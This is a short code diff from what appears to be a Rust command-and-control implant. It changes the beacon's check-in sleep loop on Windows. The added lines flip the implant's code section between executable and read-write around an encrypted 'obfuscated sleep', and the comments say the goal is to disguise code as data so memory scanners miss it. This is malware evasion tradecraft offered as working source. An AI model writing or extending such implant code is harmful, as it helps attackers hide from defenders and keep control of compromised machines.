@@ -209,10 +209,14 @@ pub fn run(config: Arc<Config>) {
         checkin_count += 1;
         let sleep_duration = helpers::sleep_with_jitter(config.get_sleep(), config.get_jitter());
 
-        // Use obfuscated sleep when evasion is enabled (encrypts memory during sleep)
+        // Use obfuscated sleep with RX flip when evasion is enabled
         #[cfg(all(target_os = "windows", feature = "evasion"))]
         {
+            // Flip code section to RW (looks like data, not code during sleep)
+            crate::utils::evasion::protect_code_section(false);
             crate::utils::evasion::obfuscated_sleep(sleep_duration * 1000);
+            // Flip back to RX (executable again)
+            crate::utils::evasion::protect_code_section(true);
         }
         #[cfg(not(all(target_os = "windows", feature = "evasion")))]
         {
